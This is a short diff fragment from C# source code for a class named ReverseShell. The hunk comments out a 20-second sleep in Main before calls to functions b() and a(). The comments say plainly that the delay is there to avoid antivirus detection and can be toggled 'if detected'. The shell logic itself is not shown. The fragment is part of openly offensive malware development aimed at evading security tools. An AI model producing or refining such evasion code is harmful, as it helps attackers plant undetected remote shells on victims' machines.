@@ -186,7 +186,7 @@ class ReverseShell
 
     static void Main()
     {
-        Thread.Sleep(20000); //deleting this might make it become detected, you can edit the time 
+        //Thread.Sleep(20000); if detected then uncomment this line
         b();
         a();
 
